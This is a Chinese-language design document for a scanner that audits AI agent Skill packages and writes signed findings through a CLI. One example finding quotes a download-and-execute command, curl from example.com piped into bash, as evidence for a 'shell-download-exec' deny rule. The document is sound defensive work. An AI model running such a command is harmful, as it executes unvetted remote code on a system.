# Skill Scanner 设计

## 1. 文档定位

本文描述 Skill Scanner 的设计。Skill Scanner 负责审查 Skill 内容并输出 `NormalizedFinding[]`，由 `skill-ledger certify` 转换为 `ScanEntry` 后写入 SignedManifest。

`skill-ledger` 负责签名、版本链和状态聚合；Skill Scanner 负责产生扫描发现。

## 2. Scanner Registry

`skill-ledger` 通过 Scanner Registry 识别扫描器、调用方式和结果 parser。

| Scanner | 类型 | 状态 | 说明 |
|---|---|---|---|
| `skill-vetter` | `skill` | 已有 | Agent 按协议执行四阶段 Skill 审查，输出 findings 文件 |
| `skill-code-scanner` | `builtin` | 设计中 | 遍历 Skill 中的代码文件，调用独立 `code-scanner` 组件并转换结果 |

`skill` 类型由 Agent 或用户提供 findings 文件，CLI 不直接调用。`builtin` 类型由 CLI 进程内调用。

## 3. NormalizedFinding

所有扫描器输出最终归一化为统一结构：

```jsonc
{
  "rule": "dangerous-exec",
  "level": "deny",
  "message": "subprocess execution detected",
  "file": "scripts/run.py",
  "line": 42,
  "metadata": {}
}
```

字段说明：

| 字段 | 必选 | 说明 |
|---|---:|---|
| `rule` | 是 | 规则或检查 ID |
| `level` | 是 | `deny` / `warn` / `pass` |
| `message` | 是 | 人类可读说明 |
| `file` | 否 | 相对 Skill 目录的文件路径 |
| `line` | 否 | 行号 |
| `metadata` | 否 | 扫描器特定字段 |

`scanStatus` 聚合由 `skill-ledger` 完成：任一扫描器为 `deny` 则整体为 `deny`，否则任一扫描器为 `warn` 则整体为 `warn`，全部通过则为 `pass`。

## 4. 扫描器设计

本章按扫描器分别说明输入、调用方式、输出和归一化规则。每个小节对应一个 scanner。

### 4.1 skill-vetter

`skill-vetter` 是 Agent 驱动的 Skill 审查协议，注册为：

```jsonc
{
  "name": "skill-vetter",
  "type": "skill",
  "parser": "findings-array",
  "description": "LLM-driven 4-phase skill audit"
}
```

执行方式：

1. Agent 根据 `skills/skill-ledger/references/skill-vetter-protocol.md` 审查目标 Skill。
2. Agent 输出 `NormalizedFinding[]` JSON 文件。
3. 用户或 Agent 调用：

```bash
agent-sec-cli skill-ledger certify <skill_dir> \
  --findings /tmp/skill-vetter-findings-<skill_name>.json \
  --scanner skill-vetter
```

四阶段审查框架：

| 阶段 | 内容 |
|---|---|
| 来源验证 | 检查目录结构、`SKILL.md`、front matter、隐藏文件和凭据类文件 |
| 代码审查 | 检查脚本中的执行、网络、凭据访问、系统修改等风险 |
| 权限边界评估 | 比对声明能力与实际行为 |
| 风险分级与输出 | 汇总 findings 并输出 JSON |

具体规则以 `skills/skill-ledger/references/skill-vetter-protocol.md` 为准。

### 4.2 skill-code-scanner

`skill-code-scanner` 是 Skill Scanner 对独立 `code-scanner` 组件的 adapter。它不改变 `code-scanner` 的输入输出模型，只负责 Skill 目录适配。

职责：

1. 遍历 Skill 目录中的代码文件。
2. 判断语言类型。
3. 调用 `code-scanner` 扫描代码片段。
4. 将 `ScanResult.findings[]` 转换为 `NormalizedFinding[]`。

建议注册：

```jsonc
{
  "name": "skill-code-scanner",
  "type": "builtin",
  "parser": "findings-array",
  "enabled": true,
  "description": "Scan Skill code files via code-scanner"
}
```

默认扫描文件类型：

| 语言 | 文件 |
|---|---|
| Bash | `*.sh`、无扩展但 shebang 为 shell 的文件 |
| Python | `*.py`、无扩展但 shebang 为 python 的文件 |

默认跳过目录：

```text
.skill-meta/
.git/
node_modules/
__pycache__/
.pytest_cache/
dist/
build/
```

结果转换规则：

| code-scanner 字段 | NormalizedFinding 字段 |
|---|---|
| `rule_id` | `rule` |
| `severity` | `level` |
| `desc_zh` / `desc_en` | `message` |
| 当前文件路径 | `file` |
| 暂无行号 | `line: null` |
| `evidence`、`language`、`engine_version` | `metadata` |

示例：

```jsonc
{
  "rule": "shell-download-exec",
  "level": "deny",
  "message": "下载并执行远程脚本",
  "file": "scripts/install.sh",
  "metadata": {
    "source": "code-scanner",
    "language": "bash",
    "evidence": ["curl http://example.com/a.sh | bash"]
  }
}
```

## 5. certify 集成

外部 findings 模式：

```bash
agent-sec-cli skill-ledger certify <skill_dir> \
  --findings /tmp/skill-vetter-findings-<skill_name>.json \
  --scanner skill-vetter
```

自动调用模式：

```bash
agent-sec-cli skill-ledger certify <skill_dir> \
  --scanners skill-code-scanner
```

多个 scanner 的结果写入同一个 manifest：

```jsonc
{
  "scans": [
    {
      "scanner": "skill-vetter",
      "status": "pass",
      "findings": []
    },
    {
      "scanner": "skill-code-scanner",
      "status": "warn",
      "findings": []
    }
  ],
  "scanStatus": "warn"
}
```

## 6. 测试要点

| 层级 | 覆盖内容 |
|---|---|
| 单元测试 | findings parser、结果转换、语言识别、目录跳过 |
| 集成测试 | `certify --findings` 写入 `skill-vetter` scan entry |
| 集成测试 | `certify --scanners skill-code-scanner` 写入 builtin scan entry |
| 回归样本 | clean / warn / deny Skill fixture |

Benchmark 数据集和报告流程保留为 TODO，不在本文展开。
